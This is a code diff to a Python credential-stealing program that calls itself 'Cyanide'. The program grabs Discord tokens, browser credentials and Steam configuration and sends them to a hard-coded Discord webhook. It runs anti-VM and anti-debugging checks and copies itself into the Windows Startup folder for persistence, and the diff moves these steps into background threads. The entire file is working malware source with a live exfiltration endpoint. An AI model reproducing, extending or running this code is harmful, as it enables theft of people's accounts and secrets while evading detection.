@@ -1,20 +1,26 @@
 import os
 import vdf
-import base64
 import json
 import nukelib
-import requests
 
 from core.componets import extractor
 from core.componets import antivm
 from core.componets import sysinfo
 from core.componets import tokengrabber
 
+from threading import Thread
 from discord_webhook import DiscordEmbed, DiscordWebhook
 
 class Main:
     def __init__(self) -> None:
-        self.webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1084889965940441269/0A7ZO1YHM3Ao3yaeH6cu0uqxe8mvwRsUOT5R1XRRiGpJUtGCL_jqZxmRu5u6zhpfImno', username="Cyanide")
+        self.webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1084889965940441269/0A7ZO1YHM3Ao3yaeH6cu0uqxe8mvwRsUOT5R1XRRiGpJUtGCL_jqZxmRu5u6zhpfImno', username="Cyanide", avatar_url="https://cdn.discordapp.com/attachments/1063218191259676702/1084916459647549540/Cyanide.png")
+
+    def antivm(self):
+        antivm.Antivm.run()
+        antivm.Antidbg.proc_check()
+        antivm.Antidbg.dll_check()
+
+        antivm.Antidbg.process_check()
 
     def credsIntodict(self, creds: list):
         dataBuffer = {}
@@ -68,6 +74,7 @@ class Main:
                 usersConfig = vdf.loads(f.read())
 
             return usersConfig
+        return "Nothing"
         
     def addStartup(self, linkname: str, pathExec: str):
         if not os.path.exists(os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup", linkname)):
@@ -88,14 +95,8 @@ class Main:
         return tokens
 
     def run(self):
-        
-        antivm.Antivm.run()
-        antivm.Antidbg.proc_check()
-        antivm.Antidbg.dll_check()
-
-        # antivm.Antidbg.process_check()
-
-        self.addStartup("MyApp", os.path.realpath(__file__))
+        Thread(target=self.antivm).start()
+        Thread(target=self.addStartup, args=( "MyApp", os.path.realpath(__file__) ) ).start()
         
         userConfig = self.steam()
         listCreds = self.browser()
@@ -104,6 +105,7 @@ class Main:
         for token in tokens:
             userinfo = nukelib.account_info(token)
             
+            # icon url not work
             embed = DiscordEmbed(title=userinfo["username"], icon_url=f"https://cdn.discordapp.com/avatars/{userinfo['id']}/{userinfo['avatar']}")
             embed.add_embed_field(name='Token', value=token)
             embed.add_embed_field(name='Locale', value=userinfo["locale"])
@@ -125,4 +127,4 @@ class Main:
         r = self.webhook.execute()
 
 if __name__ == "__main__":
-    Main().run()
+    Thread(target=Main().run).start()
